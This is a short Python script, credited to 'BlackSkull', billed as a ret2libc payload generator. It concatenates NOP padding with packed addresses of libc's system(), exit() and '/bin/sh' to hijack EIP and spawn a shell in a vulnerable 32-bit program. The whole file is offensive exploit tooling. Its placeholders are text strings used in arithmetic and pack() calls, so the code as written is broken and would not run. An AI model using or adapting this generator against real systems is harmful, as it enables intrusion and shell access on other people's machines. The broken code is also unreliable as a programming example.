#!/usr/bin/python3
"""
Author: BlackSkull
Web: https://blackskull.gitbook.io/blackskull
"""
from struct import pack

print("*********************************************")
print("*                                           *")
print("*   BLACKSKULL - RET2LIBC PAYLOAD GENERATOR  *")
print("*                                           *")
print("*********************************************")
print()
print()

offset = "Enter your EIP offset"
junk = b"\x90"*offset

base_libc_addr = "Enter your address base_libc_addr in HEX format"
system_addr_off = "Enter your system_addr_off in HEX format"
exit_addr_off = "Enter your exit_addr_off in HEX format"
bin_sh_addr_off = "Enter your bin_sh_addr_off in HEX format"

system_addr = pack("<L", base_libc_addr + system_addr_off)
exit_addr = pack("<L", base_libc_addr + exit_addr_off)
bin_sh_addr = pack("<L", base_libc_addr + bin_sh_addr_off)

payload = junk + system_addr + exit_addr + bin_sh_addr

print (payload)
